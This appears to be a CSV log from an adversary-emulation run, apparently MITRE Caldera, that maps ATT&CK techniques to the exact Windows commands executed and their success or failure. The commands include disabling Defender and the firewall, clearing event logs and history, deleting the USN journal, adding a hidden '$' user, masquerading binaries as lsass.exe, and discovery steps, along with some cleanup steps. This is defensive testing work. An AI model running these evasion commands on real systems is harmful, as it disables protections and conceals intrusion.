Operation,Agent,Ability,Technique_ID,Technique_Name,Tactic,Status,Command,Executor
smoke_test3,aojmqr,Scan WIFI networks,T1016.002,System Network Configuration Discovery: Wi-Fi Discovery,discovery,Failed,.\obfuscated_payload.ps1 -Scan,psh
smoke_test3,aojmqr,Preferred WIFI,T1016.002,System Network Configuration Discovery: Wi-Fi Discovery,discovery,Success,.\wifi.ps1 -Pref,psh
smoke_test3,aojmqr,Sniff network traffic,T1040,Network Sniffing,credential-access,Failed,"$path = ""$ENV:UserProfile\Desktop\pcap.etl"";New-NetEventSession -Name ""PCAP"" -CaptureMode SaveToFile -LocalFilePath $path;Add-NetEventProvider -Name ""Microsoft-Windows-TCPIP"" -SessionName ""PCAP"";Start-NetEventSession -Name ""PCAP"";Start-Sleep -s 60;Stop-NetEventSession -Name ""PCAP"";if (Test-Path $path) {  echo $path;  exit 0;} else {  echo ""Failed to generate PCAP file."";  exit 1;};",psh
smoke_test3,aojmqr,Sniff network traffic,T1040,Network Sniffing,credential-access,Success,"Remove-NetEventSession -Name ""PCAP"";Remove-Item $ENV:UserProfile\Desktop\pcap.etl;",psh
smoke_test3,aojmqr,Compress staged directory,T1560.001,Archive Collected Data: Archive via Utility,collection,Success,rm C:\Users\shank\Desktop\calderalab\staged.zip,psh
smoke_test3,aojmqr,Create local staging directory,T1074.001,Data Staged: Local Data Staging,collection,Success,"Remove-Item -Path ""staged"" -recurse",psh
smoke_test3,aojmqr,Screen Capture,T1113,Screen Capture,collection,Success,"$filePath = ""$HOME\Desktop\screenshot.png""; if (Test-Path -Path $filePath) { del $filePath; };",psh
smoke_test,aojmqr,Avoid logs,T1070.003,Indicator Removal on Host: Clear Command History,defense-evasion,Success,Clear-History;Clear,psh
smoke_test,aojmqr,Prevent Powershell History Logging,T1070.003,Indicator Removal on Host: Clear Command History,stealth,Success,Set-PSReadlineOption -HistorySaveStyle SaveNothing,psh
smoke_test,aojmqr,Disable Windows Defender All,T1562.001,Impair Defenses: Disable or Modify Tools,defense-evasion,Success,Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;,psh
smoke_test,aojmqr,Grant Full Access to folder for Everyone - Ryuk Ransomware Style,T1222.001,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,defense-impairment,Success,"icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q",cmd
smoke_test,aojmqr,Move Powershell & triage,T1036.003,Masquerading: Rename Legitimate Utilities,defense-evasion,Success,Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;,psh
smoke_test,aojmqr,Clear Windows Event Logs,T1070.001,Indicator Removal on Host: Clear Windows Event Logs,defense-evasion,Success,Clear-Eventlog Security;Clear-Eventlog System;,psh
smoke_test,aojmqr,Disable Microsoft Defender Firewall,T1686,Disable or Modify System Firewall,defense-impairment,Success,netsh advfirewall set currentprofile state off,cmd
smoke_test,aojmqr,Create Windows Hidden File with Attrib,T1564.001,Hide Artifacts: Hidden Files and Directories,stealth,Success,attrib.exe +h %temp%\T1564.001.txt,cmd
smoke_test,aojmqr,Change Powershell Execution Policy to Bypass,T1112,Modify Registry,multiple,Success,Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine,psh
smoke_test,aojmqr,File Extension Masquerading,T1036.007,Masquerading: Double File Extension,stealth,Success,"copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1",cmd
smoke_test,aojmqr,Hidden Window,T1564.003,Hide Artifacts: Hidden Window,stealth,Success,Start-Process powershell.exe -WindowStyle hidden calc.exe,psh
smoke_test,aojmqr,Masquerading - non-windows exe running as windows exe,T1036.003,Masquerading: Rename System Utilities,stealth,Failed,"copy ""1db90b_T1036.003.exe"" ($env:TEMP + ""\svchost.exe""); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + ""\svchost.exe"")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003",psh
smoke_test,aojmqr,Indicator Removal using FSUtil,T1070,Indicator Removal on Host,stealth,Success,fsutil usn deletejournal /D C:,cmd
smoke_test,aojmqr,"Create a Hidden User Called ""$""",T1564,Hide Artifacts,stealth,Success,net user $ ATOMIC123! /add /active:yes,cmd
smoke_test,aojmqr,Malicious process Masquerading as LSM.exe,T1036.003,Masquerading: Rename System Utilities,stealth,Success,copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt,cmd
smoke_test,aojmqr,Rundll32 setupapi.dll Execution,T1218.011,Signed Binary Proxy Execution: Rundll32,stealth,Failed,"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""4c870d_T1218.011_DefaultInstall.inf""",cmd
smoke_test,aojmqr,Masquerading as Windows LSASS process,T1036.003,Masquerading: Rename System Utilities,stealth,Success,copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe && %SystemRoot%\Temp\lsass.exe /B,cmd
smoke_test,aojmqr,Read volume boot sector via DOS device path (PowerShell),T1006,Direct Volume Access,stealth,Failed,"$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream ""\\.\C:"", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer",psh
smoke_test,aojmqr,Masquerading as Windows LSASS process,T1036.003,Masquerading: Rename System Utilities,stealth,Failed,del /Q /F %SystemRoot%\Temp\lsass.exe >nul 2>&1,cmd
smoke_test,aojmqr,Malicious process Masquerading as LSM.exe,T1036.003,Masquerading: Rename System Utilities,stealth,Failed,del C:\T1036.003.txt >nul 2>&1 && del C:\lsm.exe >nul 2>&1,cmd
smoke_test,aojmqr,"Create a Hidden User Called ""$""",T1564,Hide Artifacts,stealth,Failed,net user $ /DELETE 2>&1,cmd
smoke_test,aojmqr,Indicator Removal using FSUtil,T1070,Indicator Removal on Host,stealth,Failed,fsutil usn createjournal m=1000 a=100 c:,cmd
smoke_test,aojmqr,Masquerading - non-windows exe running as windows exe,T1036.003,Masquerading: Rename System Utilities,stealth,Failed,"Remove-Item ($env:TEMP + ""\svchost.exe"") -Force -ErrorAction Ignore",psh
smoke_test,aojmqr,File Extension Masquerading,T1036.007,Masquerading: Double File Extension,stealth,Failed,del /f %temp%\T1036.007_masquerading.docx.exe > nul 2>&1 && del /f %temp%\T1036.007_masquerading.pdf.exe > nul 2>&1 && del /f %temp%\T1036.007_masquerading.ps1.exe > nul 2>&1 && del /f %temp%\T1036.007_masquerading.xls.vbs > nul 2>&1 && del /f %temp%\T1036.007_masquerading.xlsx.vbs > nul 2>&1 && del /f %temp%\T1036.007_masquerading.png.vbs > nul 2>&1 && del /f %temp%\T1036.007_masquerading.doc.ps1 > nul 2>&1 && del /f %temp%\T1036.007_masquerading.pdf.ps1 > nul 2>&1 && del /f %temp%\T1036.007_masquerading.rtf.ps1 > nul 2>&1,cmd
smoke_test,aojmqr,Change Powershell Execution Policy to Bypass,T1112,Modify Registry,multiple,Failed,try { Set-ExecutionPolicy -ExecutionPolicy Default -Scope LocalMachine -Force } catch {},psh
smoke_test,aojmqr,Create Windows Hidden File with Attrib,T1564.001,Hide Artifacts: Hidden Files and Directories,stealth,Failed,del /A:H %temp%\T1564.001.txt >nul 2>&1,cmd
smoke_test,aojmqr,Disable Microsoft Defender Firewall,T1686,Disable or Modify System Firewall,defense-impairment,Failed,netsh advfirewall set currentprofile state on >nul 2>&1,cmd
smoke_test,aojmqr,Grant Full Access to folder for Everyone - Ryuk Ransomware Style,T1222.001,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,defense-impairment,Failed,icacls 'C:\Users\Public\*' /restore %temp%\T1222.001-folder-perms-backup.txt /q >nul 2>&1,cmd
smoke_test,aojmqr,Disable Windows Defender All,T1562.001,Impair Defenses: Disable or Modify Tools,defense-evasion,Failed,Set-MpPreference -DisableIntrusionPreventionSystem $false;Set-MpPreference -DisableIOAVProtection $false;Set-MpPreference -DisableRealtimeMonitoring $false;Set-MpPreference -DisableScriptScanning $false;Set-MpPreference -EnableControlledFolderAccess Enabled;,psh
smoke_test,aojmqr,Prevent Powershell History Logging,T1070.003,Indicator Removal on Host: Clear Command History,stealth,Failed,Set-PSReadLineOption -HistorySaveStyle SaveIncrementally,psh
smoke_test2,aojmqr,Identify active user,T1033,System Owner/User Discovery,discovery,Success,$env:username,psh
smoke_test2,aojmqr,Identify local users,T1087.001,Account Discovery: Local Account,discovery,Success,Get-WmiObject -Class Win32_UserAccount,psh
smoke_test2,aojmqr,Find user processes,T1057,Process Discovery,discovery,Success,"$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}};foreach($p in $ps) {    if($p.Owner -eq ""shank"") {        $p;    }}",psh
smoke_test2,aojmqr,View admin shares,T1135,Network Share Discovery,discovery,Success,Get-SmbShare | ConvertTo-Json,psh
smoke_test2,aojmqr,Discover domain controller,T1018,Remote System Discovery,discovery,Failed,nltest /dsgetdc:$env:USERDOMAIN,psh
smoke_test2,aojmqr,Discover antivirus programs,T1518.001,Software Discovery: Security Software Discovery,discovery,Success,wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value,psh
smoke_test2,aojmqr,Permission Groups Discovery,T1069.001,Permission Groups Discovery: Local Groups,discovery,Success,gpresult /R,psh
smoke_test2,aojmqr,Identify Firewalls,T1518.001,Software Discovery: Security Software Discovery,discovery,Success,"$NameSpace = Get-WmiObject -Namespace ""root"" -Class ""__Namespace"" | Select Name | Out-String -Stream | Select-String ""SecurityCenter"";$SecurityCenter = $NameSpace | Select-Object -First 1;Get-WmiObject -Namespace ""root\$SecurityCenter"" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;",psh
